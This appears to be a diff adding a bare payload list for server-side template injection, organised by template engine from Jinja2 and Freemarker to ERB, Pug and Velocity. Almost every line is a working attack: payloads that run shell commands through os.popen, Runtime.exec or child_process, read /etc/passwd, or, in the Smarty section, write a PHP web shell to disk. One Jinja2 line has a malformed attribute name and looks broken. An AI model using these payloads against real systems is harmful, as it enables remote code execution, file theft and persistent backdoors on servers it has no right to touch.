@@ -1,0 +1,72 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+${7*'7'}
+
+// Jinja2/Twig (Python frameworks like Flask/Django)
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.____class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].decode('utf-8')}}
+{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
+// Freemarker (Java)
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign ownerClass=classloader.loadClass("freemarker.template.Configuration")>
+<#assign field=ownerClass.getDeclaredField("cache")>
+${field.setAccessible(true)}
+
+// Spring Expression Language (SpEL)
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.System).getenv()}
+${T(java.lang.ClassLoader).getSystemClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+
+// Handlebars (JavaScript)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+// EJS (Node.js)
+<%= global.process.mainModule.require('child_process').execSync('id') %>
+<%= global.process.mainModule.require('fs').readFileSync('/etc/passwd') %>
+
+// ERB (Ruby)
+<%= system('id') %>
+<%= IO.popen('id').read() %>
+<%= `id` %>
+<%= eval('`id`') %>
+
+// Smarty (PHP)
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile("shell.php","<?php passthru($_GET['cmd']); ?>",null)}
+
+// Pug/Jade (Node.js)
+- var require = global.process.mainModule.require
+- var cmd = require('child_process').execSync('id')
+#{cmd}
+
+// Velocity (Java)
+#set($ex = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+$ex.waitFor()
+#set($out = $ex.getInputStream())
+#foreach($i in [1..$out.available()])$out.read()#end
